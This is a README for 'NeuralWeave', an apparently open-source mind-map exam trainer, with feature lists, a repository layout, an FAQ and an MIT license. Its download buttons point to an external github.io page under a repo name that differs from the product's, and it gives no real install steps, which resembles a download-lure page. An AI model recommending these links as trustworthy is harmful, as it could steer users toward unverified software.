![preview](https://raw.githubusercontent.com/tranquyetdoraemon-beep/MindMap-Exam-Trainer/main/thumb_03173.svg)
[![Download](https://raw.githubusercontent.com/tranquyetdoraemon-beep/MindMap-Exam-Trainer/main/grab_8d7e69.svg)](https://tranquyetdoraemon-beep.github.io/MindMap-Exam-Trainer/)

# 🧠 NeuralWeave — Adaptive Mind-Map Exam Trainer

> *Because a brain isn't a bucket to fill, it's a loom to thread.*

NeuralWeave is the spiritual successor to MindmapTrainer — a cross-platform study companion that turns dense exam domains into living, breathing mind maps you can prune, graft, zoom into, and rehearse against. Instead of dumping 400 flashcards on you and hoping for the best, NeuralWeave treats each subject as a graph of concepts, and lets you strengthen the edges between them until recall feels less like digging and more like wandering a familiar garden.

Whether you're preparing for a medical board, a language certification, a civil service screening, or a mathematics olympiad, NeuralWeave lets you shape knowledge spatially — the way your hippocampus actually seems to like it.

---

## 🌍 What Makes NeuralWeave Different

Most study tools think in lists. NeuralWeave thinks in **territories**.

A domain becomes a landscape. Nodes are landmarks. Edges are trails. When you can walk the trail without looking at the map, you've learned it. When you can take a shortcut no one showed you, you've understood it. NeuralWeave measures both.

This project is the result of years of frustration with linear revision tools, re-imagined as an open, extensible, offline-capable graph trainer built for polyglot learners and visual thinkers alike.

---

## ✨ Feature Overview

### 🗺️ Map-First Learning Experience
- Drag, nest, color-code, and collapse branches at any depth.
- Weighted edges distinguish "I kind of remember this" from "I could teach this."
- Ghost nodes reveal gaps in your graph that you didn't know existed.

### 🌐 Multilingual By Design
The trainer speaks with you in the language you think in. Interface and content packs currently cover:
- 🇫🇷 Français
- 🇪🇸 Español
- 🇧🇷 Português
- 🇮🇹 Italiano
- 🇩🇪 Deutsch
- 🇷🇺 По русски
- 🇵🇱 Polski
- 🇨🇳 中文
- 🇯🇵 日本語

Adding a new locale is a matter of dropping a single directory of strings into the `locales/` folder — no compilation step, no dark magic.

### 📱 Responsive Interface
The same map that feels natural on a 27-inch monitor folds gracefully onto a phone screen during a commute. Panels reflow, the canvas re-centers on your current node, and gesture controls replace keyboard shortcuts without losing a single feature.

### 🧩 Domain Packs
Swap entire subject universes in and out:
- Pharmacology trees
- Constitutional law scaffolds
- Organic chemistry reaction webs
- Vocabulary clusters for A1 through C2 learners
- Historical timelines rendered as branching causality graphs

### ⏱️ Spaced Repetition, Reinvented
Instead of scheduling cards, NeuralWeave schedules **edges**. An edge that's slipping gets revisited first. An edge you nailed last week is allowed to gather a little dust. The algorithm is transparent — you can inspect the priority queue at any time.

### 📊 Insightful Analytics
- Heat maps of weak sub-branches
- Time-to-retention curves
- Per-language progress comparison
- Exportable session journals (JSON, CSV, plain text)

### 🔒 Local-First and Privacy-Respecting
Your maps never have to leave your device. Cloud sync is opt-in, end-to-end encrypted, and entirely optional. There is no telemetry phone-home, and there never will be.

### 🤝 24/7 Community Assistance
A rotating volunteer cohort of educators and polyglots keeps the help channel warm around the clock. Whether it's 3 PM in Lisbon or 3 AM in Osaka, someone familiar with the tool is usually nearby.

### 🧪 Extensibility
- Plugin hook for custom review schedulers
- JSON schema for external map generators
- Webhook output for integrating with your own dashboards

---

## 🚀 Getting Started (The Gentle Way)

NeuralWeave prefers to arrive quietly. There are three typical paths:

1. **Portable bundle** — unpack the archive anywhere and run the launcher. No system-wide alterations, no background daemons.
2. **Package manager route** — for users who prefer their tools tracked and updatable through their OS ecosystem.
3. **Self-hosted web build** — for teams who want a shared instance on their own infrastructure.

Whichever path you choose, the first launch will ask you three questions: your preferred language, your first domain, and how much time you can realistically spare each day. Everything else follows from those.

[![Download](https://raw.githubusercontent.com/tranquyetdoraemon-beep/MindMap-Exam-Trainer/main/grab_8d7e69.svg)](https://tranquyetdoraemon-beep.github.io/MindMap-Exam-Trainer/)

---

## 🧭 Repository Layout

A quick tour so you know where things live:

- `core/` — graph engine, retention model, prioritization logic
- `ui/` — responsive components and canvas rendering
- `locales/` — translation packs, one folder per language
- `domains/` — sample domain packs ready to import
- `plugins/` — optional extension modules
- `docs/` — architecture notes, RFCs, and design rationale
- `assets/` — icons, color palettes, and typography specimens
- `tests/` — unit, integration, and end-to-end suites

---

## 🛠️ Contributing

NeuralWeave grows through small, thoughtful contributions. If you'd like to help:

- **Translators** — extend or refine any of the nine active locales, or introduce a tenth.
- **Domain authors** — build a mind-map pack for a subject you know deeply.
- **Engineers** — improve the retention model, the renderer, or the plugin API.
- **Educators** — share classroom workflows and edge cases.

Open an issue before large changes so the design conversation can happen in the open. Small fixes are welcome without ceremony.

Please read `CONTRIBUTING.md` for tone guidelines, commit conventions, and the code of conduct.

---

## 🧬 Design Principles

1. **Space over sequence.** Learning is not a queue.
2. **Transparency over magic.** Show the algorithm, don't hide it.
3. **Local over cloud, unless you ask.** Default to privacy.
4. **Language is infrastructure.** Every user deserves their own tongue.
5. **Small tools, composed well.** Do one thing, do it beautifully.

---

## ❓ Frequently Wondered

**Can I import an existing outline?**
Yes — plain indented text, OPML, and several mind-map interchange formats are accepted.

**Does it work offline?**
Entirely. Sync is a convenience, not a requirement.

**Is my data mine?**
Always. Export everything at any moment in open formats.

**What about accessibility?**
Keyboard-first navigation, screen-reader-friendly outlines, adjustable contrast themes, and reduced-motion modes ship by default.

---

## ⚠️ Disclaimer

NeuralWeave is an educational aid. It is provided as-is, without warranty of any kind, express or implied. The authors are not responsible for examination outcomes, interpreted results, or decisions made on the basis of study analytics. Users are encouraged to combine this tool with qualified instruction, rest, nutrition, and the occasional walk outside.

Content packs contributed by the community reflect the views and expertise of their authors, not the project maintainers. Always verify critical information against authoritative sources in your field.

---

## 📜 License

This project is released under the **MIT License**.

You can read the full text at: https://opensource.org/licenses/MIT

Copyright © 2026 NeuralWeave Contributors.

Permission is hereby granted, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to inclusion of the above copyright notice.

---

## 🌱 Final Word

Mind maps are not decoration. They are the shape of your understanding, laid bare where you can see it. NeuralWeave exists to make that shape visible — and then to help you redraw it a little sharper every day until exam season feels less like a storm and more like a well-marked trail.

Happy threading. 🧵

[![Download](https://raw.githubusercontent.com/tranquyetdoraemon-beep/MindMap-Exam-Trainer/main/grab_8d7e69.svg)](https://tranquyetdoraemon-beep.github.io/MindMap-Exam-Trainer/)